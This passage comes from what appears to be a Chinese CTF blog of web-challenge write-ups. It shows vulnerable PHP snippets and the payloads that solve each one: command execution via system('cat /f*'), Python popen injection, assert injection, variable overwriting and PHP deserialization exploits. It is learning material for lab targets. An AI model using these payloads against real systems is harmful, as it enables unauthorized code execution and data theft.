class=\"number\">4</span>][<span class=\"number\">4</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>一个看似很绕的代码，我们一层一层的看：</p>\n<p><strong>$_COOKIE[‘CTFshow-QQ群:’]</strong></p>\n<p>我们将<strong>cookie</strong>里的**CTFshow-QQ群:**的值设置为a，</p>\n<p>现在内容就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[$_POST[a]]]</span><br></pre></td></tr></table></figure>\n\n<p>然后接着是post方式传入a&#x3D;b</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[$_GET[b]]</span><br></pre></td></tr></table></figure>\n\n<p>然后用get方式传入b&#x3D;c</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_REQUEST[c][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>\n\n<p>REQUEST我们既可以用get方式也可以用post方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>这里要注意cookie中的**<u>CTFshow-QQ群:</u>**含有中文字符</p>\n<p>我们要将中文字符进行url解码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CTFshow-QQ%E7%BE%A4:=a</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"web2-c0me-t0-s1gn\"><a href=\"#web2-c0me-t0-s1gn\" class=\"headerlink\" title=\"web2 c0me_t0_s1gn\"></a>web2 c0me_t0_s1gn</h2><p>F12</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445898.png\"\n                        alt=\"图片-1680664313075\"\n                 ></p>\n<p>提示说去控制台</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try to run the function &quot;g1ve_flag()&quot; to get the flag!</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151445782.png\"\n                        alt=\"图片-1680664326857\"\n                 ></p>\n<h2 id=\"我的眼里只有\"><a href=\"#我的眼里只有\" class=\"headerlink\" title=\"我的眼里只有$\"></a>我的眼里只有$</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$_POST</span>);</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n\n<p>变量嵌套问题，先给$_赋值：$__&#x3D;a,然后给a赋值，以此类推一共有36个$，所有我们要赋值36次，写个脚本来跑一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">s = string.ascii_letters </span><br><span class=\"line\">t=<span class=\"string\">&#x27;_=a&amp;&#x27;</span></span><br><span class=\"line\">code=<span class=\"string\">&quot;phpinfo();&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">35</span>):</span><br><span class=\"line\">    t+=s[i]+<span class=\"string\">&quot;=&quot;</span>+s[i+<span class=\"number\">1</span>]+<span class=\"string\">&#x27;&amp;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">t+=s[i]+<span class=\"string\">&#x27;=&#x27;</span>+code</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;I=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"一言既出\"><a href=\"#一言既出\" class=\"headerlink\" title=\"一言既出\"></a>一言既出</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">highlight_file(__FILE__); </span><br><span class=\"line\">include &quot;flag.php&quot;;  </span><br><span class=\"line\">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    if ($_GET[&#x27;num&#x27;] == 114514)&#123;</span><br><span class=\"line\">        assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>assert里面如果是字符串的话，会将字符串当作php代码执行，与eval不同的一点是，结尾不需要分号</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514);//      将前面闭合并且注释掉后面的部分（妙啊）</span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514%2b1805296     %2b为加号url编码，两个相加等于1919810</span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514);1919810    跟第一种方法类似</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"驷马难追\"><a href=\"#驷马难追\" class=\"headerlink\" title=\"驷马难追\"></a>驷马难追</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>] == <span class=\"number\">114514</span> &amp;&amp; <span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">              <span class=\"title function_ invoke__\">assert</span>(<span class=\"string\">&quot;intval(<span class=\"subst\">$_GET</span>[num])==1919810&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">     &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"><span class=\"variable\">$str</span></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/[a-z]|\\;|\\(|\\)/&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>相较于上一个题，过滤了字母，分号，括号，仍然可以用%2b绕过</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514%2b1805296</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"TapTapTap\"><a href=\"#TapTapTap\" class=\"headerlink\" title=\"TapTapTap\"></a>TapTapTap</h2><p>F12控制台求值，flag在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/secret_path_you_do_not_know/secretfile.txt</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">init</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;cmd)) &#123;</span><br><span class=\"line\">                <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">exec</span>(<span class=\"variable\">$this</span>-&gt;cmd);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exec</span>(<span class=\"params\"><span class=\"variable\">$cmd</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$result</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$serializecmd</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serializecmd</span>);</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>一到简单的反序列化题目</p>\n<p>目标点在webshell类上的init函数，反序列化后直接执行。。。</p>\n<p>exp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;cat f*&#x27;</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Webshell</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"><span class=\"comment\">// O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;cat f*&quot;;&#125; </span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"化零为整\"><a href=\"#化零为整\" class=\"headerlink\" title=\"化零为整\"></a>化零为整</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$result=&#x27;&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">for ($i=1;$i&lt;=count($_GET);$i++)&#123;</span><br><span class=\"line\">    if (strlen($_GET[$i])&gt;1)&#123;</span><br><span class=\"line\">        die(&quot;你太长了！！&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">    $result=$result.$_GET[$i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($result ===&quot;大牛&quot;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>中文在php里面长度是3，其实很容易想到中文的url编码就是3个</p>\n<p>我们将大牛进行url编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%E5%A4%A7%E7%89%9B</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"无一幸免\"><a href=\"#无一幸免\" class=\"headerlink\" title=\"无一幸免\"></a>无一幸免</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class=\"line\">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class=\"line\">    if ($arr[]=1)&#123;</span><br><span class=\"line\">        die($flag);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&quot;nonono!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>代码部分7，8行条件判断，这里$arr[]&#x3D;1是个赋值操作，也就是说代码走到这里if条件始终为ture，可以die出flag，那么给0可随便赋值。空值也无所谓。</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?0=0</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"传说之下（雾）\"><a href=\"#传说之下（雾）\" class=\"headerlink\" title=\"传说之下（雾）\"></a>传说之下（雾）</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 1</span><br></pre></td></tr></table></figure>\n\n<p>js代码中第275行，将这个改为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 2077</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"算力超群\"><a href=\"#算力超群\" class=\"headerlink\" title=\"算力超群\"></a>算力超群</h2><p>抓个包先</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /_calculate?number1=5&amp;operator=*&amp;number2=6 HTTP/1.1</span><br></pre></td></tr></table></figure>\n\n<p>传递了3个参数，我们分别对这个三个参数污染一下</p>\n<p>发现number1,operator都有过滤，对number2时直接报错了</p>\n<p>直接对number2 RCE</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/_calculate?number1=5&amp;operator=*&amp;number2=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"遍地飘零\"><a href=\"#遍地飘零\" class=\"headerlink\" title=\"遍地飘零\"></a>遍地飘零</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class=\"line\">    echo &quot;好多零&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;</span><br><span class=\"line\">    var_dump($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>本题考察的是变量覆盖</p>\n<p>我们传入?_GET&#x3D;flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($_GET);=&gt;  var_dump($flag);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"茶歇区\"><a href=\"#茶歇区\" class=\"headerlink\" title=\"茶歇区\"></a>茶歇区</h2><p>抓包</p>\n<p>没怎么搞懂，看wp说是php整数溢出，</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=0&amp;b=0&amp;c=0&amp;d=0&amp;e=999999999999999999&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"小舔田\"><a href=\"#小舔田\" class=\"headerlink\" title=\"小舔田\"></a>小舔田</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name=&quot;月亮&quot;;</span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        return $this-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;牛夫人&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function call()&#123;</span><br><span class=\"line\">        global $flag;</span><br><span class=\"line\">        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\\n&quot;;</span><br><span class=\"line\">            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        $this-&gt;call();</span><br><span class=\"line\">        return &quot;\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----&quot;.$this-&gt;nickname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    $a=new Ion_Fan_Princess();</span><br><span class=\"line\">    echo $a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在Ion_Fan_Princess类下的 call函数可以 echo $flag</p>\n<p>Ion_Fan_Princess类的__toString可以出发call函数</p>\n<p>Moon类 下的 __wakeup可以触发 ____toString</p>\n<p>pop链</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Moon::__wakeup =&gt; Ion_Fan_Princess::__toString =&gt; Ion_Fan_Princess::call</span><br></pre></td></tr></table></figure>\n\n\n\n<p>exp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class 